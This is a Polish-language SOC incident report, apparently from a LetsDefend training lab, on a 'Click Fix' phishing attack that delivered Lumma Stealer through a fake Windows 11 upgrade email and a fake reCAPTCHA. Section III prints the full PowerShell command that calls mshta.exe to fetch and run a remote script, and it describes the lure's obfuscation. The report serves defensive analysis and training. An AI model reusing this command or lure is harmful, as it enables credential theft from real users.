# Raport z Incydentu Bezpieczeństwa: SOC338
**Data raportu:** 2025-03-13  
**Status:** ZAKOŃCZONY (Host Izolowany)  

---

## 1. Podsumowanie (Executive Summary)
Dnia 13 marca 2025 r. o godzinie 09:44 systemy bezpieczeństwa wykryły incydent typu phishing wymierzony w pracownika **Dylan**. Atak wykorzystał technikę socjotechniczną **"Click Fix"** pod pozorem aktualizacji systemu do Windows 11. Celem ataku była dystrybucja złośliwego oprogramowania **Lumma Stealer** służącego do kradzieży tożsamości i poświadczeń. Mimo wykrycia zagrożenia przez systemy (Alert SOC338), brak restrykcyjnej polityki blokowania pozwolił na uruchomienie złośliwego kodu.

---

## 2. Szczegóły Techniczne
| Atrybut | Wartość |
| :--- | :--- |
| **ID Zdarzenia** | 316 (SOC338) |
| **Host / Użytkownik** | EC2AMAZ-ILGVOIN / Dylan (`dylan@letsdefend.io`) |
| **Źródłowy adres IP (SMTP)** | `132.232.40.201` |
| **Adres nadawcy** | `update@windows-update.site` |
| **Temat wiadomości** | Upgrade your system to Windows 11 Pro for FREE |
| **Serwer C2 / Payload** | `overcoatpassably.shop` |

---

## 3. Analiza Przebiegu Ataku (Attack Kill Chain)

### I. Dostarczenie i Inicjacja (Initial Access)
Atakujący przesłał wiadomość e-mail z domeny o niskiej renomie (`windows-update.site`). Wiadomość nakłaniała użytkownika do kliknięcia w złośliwy link w celu "darmowej aktualizacji". Brak włączonych polityk SPF/DKIM/DMARC pozwolił na dostarczenie wiadomości do skrzynki odbiorczej (Device Action: **Allowed**).

### II. Interakcja i Socjotechnika (Execution - Click Fix)
Po wejściu na stronę, użytkownik został poddany technice **"Click Fix"**. Wyświetlono fałszywe okno reCAPTCHA, które instruowało ofiarę, aby skopiowała i wkleiła do terminala PowerShell złośliwe polecenie pod pozorem "weryfikacji".

### III. Wykonanie ładunku (Execution - Fileless)
Użytkownik wykonał zaciemnioną (obfuskowaną) komendę:
* **Komenda inicjująca:** PowerShell z parametrem `-replace ']'` oraz komentarzem sugerującym bezpieczeństwo (`# I am not a robot`).
* **Komenda wykonawcza:** `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"`
Proces `powershell.exe` wywołał narzędzie systemowe `mshta.exe` (T1218.005), które pobrało złośliwy skrypt ukryty w pliku `maloy.mp4` bezpośrednio do pamięci RAM.

### IV. Infekcja (Malware Installation)
Uruchomienie skryptu doprowadziło do pełnej infekcji systemem **Lumma Stealer**. Oprogramowanie to rozpoczęło próbę eksfiltracji danych wrażliwych (hasła, pliki cookies, dane z przeglądarek).

---

## 4. Wskaźniki Kompromitacji (IoC)
* **Adres IP (SMTP):** `132.232.40.201` (oznaczony jako Lumma Stealer)
* **Domena nadawcy:** `windows-update.site`
* **Domena C2/Payload:** `overcoatpassably.shop`
* **Złośliwe narzędzie:** `C:\\Windows\\system32\\mshta.exe` wywołane z adresem URL.

---

## 5. Podjęte Działania (Response)
1. **Izolacja:** Host został natychmiast odizolowany od sieci w celu przerwania komunikacji z serwerem C2.
2. **Analiza:** Potwierdzono autentyczność alertu (True Positive) na podstawie logów procesu `mshta.exe`.
3. **Weryfikacja:** Przeskanowano system w poszukiwaniu trwałych śladów obecności malware (Persistence).

---

## 6. Wnioski i Rekomendacje (Lessons Learned)

> [!IMPORTANT]
> **Incydent obnażył brak aktywnych polityk blokowania (Enforcement) dla znanych zagrożeń typu Stealer.**

* **Polityka Antyphishingowa:** Wdrożenie rygorystycznego sprawdzania rekordów **SPF, DKIM oraz konfiguracja DMARC** (polityka `reject`), aby uniemożliwić spoofing i dostarczanie maili z domen o złej sławie.
* **Ochrona Punktów Końcowych (EDR):** Konfiguracja reguł blokujących uruchamianie procesów `mshta.exe` oraz `powershell.exe` z argumentami zawierającymi adresy URL.
* **Filtrowanie DNS/Web:** Wdrożenie kontroli reputacji domen w czasie rzeczywistym, aby blokować dostęp do nowo zarejestrowanych stron (takich jak `overcoatpassably.shop`).
* **Edukacja Użytkowników:** Przeprowadzenie szkoleń z zakresu rozpoznawania ataków typu "Click Fix" (wklejanie kodu do terminala).
"""
